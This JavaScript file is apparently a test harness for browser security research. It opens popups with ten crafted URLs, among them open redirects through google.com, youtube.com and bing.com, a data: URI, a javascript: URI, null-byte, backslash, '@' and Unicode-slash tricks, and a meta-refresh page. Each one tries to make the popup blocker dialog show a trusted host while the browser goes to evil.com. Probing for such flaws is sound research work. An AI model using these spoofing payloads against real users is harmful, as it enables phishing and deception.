// Popup URL Spoof — Creative Bypass Tests (Chrome 148 macOS)

(function() {
  var d = document.getElementById('display');
  if (!d) return;

  var tests = [
    {
      label: 'Google Open Redirect',
      desc: 'Real google.com → redirects to evil.com after allow',
      url: 'https://www.google.com/url?q=https://evil.com/search%3Fq%3Dwhat%2Bis%2Bclaude'
    },
    {
      label: 'YouTube Redirect',
      desc: 'Real youtube.com → redirects to evil.com',
      url: 'https://www.youtube.com/redirect?q=https://evil.com/search%3Fq%3Dtest'
    },
    {
      label: 'Data URI with embedded host',
      desc: 'data: URI containing "google.com" text → redirects to evil.com',
      url: 'data:text/html,https://www.google.com/' + '%20'.repeat(80) +
           '<script>location="https://evil.com"<' + '/script>'
    },
    {
      label: 'Javascript URI',
      desc: 'javascript: URI — how does popup dialog show it?',
      url: 'javascript:void(location="https://evil.com/search?q=what+is+claude")'
    },
    {
      label: 'Null Byte (%00)',
      desc: '%00 may confuse URL parser display',
      url: 'https://www.google.com%00.search@evil.com/search?q=what+is+claude'
    },
    {
      label: 'About:Blank + Meta Refresh',
      desc: 'Opens about:blank, writes meta refresh to evil.com',
      url: 'about:blank',
      special: true
    },
    {
      label: 'Bing Redirect',
      desc: 'Real bing.com → redirects to evil.com',
      url: 'https://www.bing.com/ck/a?redirect=https://evil.com/search%3Fq%3Dtest'
    },
    {
      label: 'Backslash in URL',
      desc: 'Backslash \\\\ might confuse display parser',
      url: 'https://www.google.com\\\\@evil.com/search?q=what+is+claude'
    },
    {
      label: 'Unicode ∕ (U+2215)',
      desc: 'Unicode fraction slash looks like /',
      url: 'https://www.google.com%E2%88%95evil.com/search?q=what+is+claude'
    },
    {
      label: 'IP Decimal',
      desc: '2130706433 = 127.0.0.1 in decimal — display confusion',
      url: 'https://www.google.com@2130706433/search?q=what+is+claude'
    }
  ];

  var html = '';
  for (var i = 0; i < tests.length; i++) {
    var t = tests[i];
    html +=
      '<div class="test-item" data-idx="' + i + '">' +
        '<div style="font-size:12px;font-weight:600">' + (i+1) + '. ' + t.label + '</div>' +
        '<div style="font-size:10px;color:#888;margin:2px 0">' + t.desc + '</div>' +
        '<div style="font-size:9px;font-family:monospace;word-break:break-all;color:#555;margin:4px 0">' +
        t.url.substring(0, 90) + (t.url.length > 90 ? '...' : '') + '</div>' +
        '<button class="test-btn" data-idx="' + i + '">Test This URL</button>' +
      '</div>';
  }

  html += '<div style="font-size:10px;color:#888;margin-top:12px">' +
    '<b>Test:</b> Click buttons → check popup blocker dialog (🔴✕ in address bar).<br>' +
    'Which URL types show a <b>trusted host</b> while actually going to <b>evil.com</b>?</div>';

  d.innerHTML = html;

  // Add click handlers via event delegation (no CSP issues)
  d.addEventListener('click', function(e) {
    var btn = e.target.closest('.test-btn');
    if (!btn) return;
    var idx = parseInt(btn.getAttribute('data-idx'));
    if (isNaN(idx) || !tests[idx]) return;

    var t = tests[idx];

    if (t.special && t.label === 'About:Blank + Meta Refresh') {
      var w = window.open('about:blank', '_blank');
      if (w) {
        w.document.write('<meta http-equiv="refresh" content="0;url=https://evil.com/search?q=what+is+claude">' +
                         '<p>Redirecting...</p>');
        w.document.close();
      }
    } else {
      window.open(t.url, '_blank');
    }
  });
})();
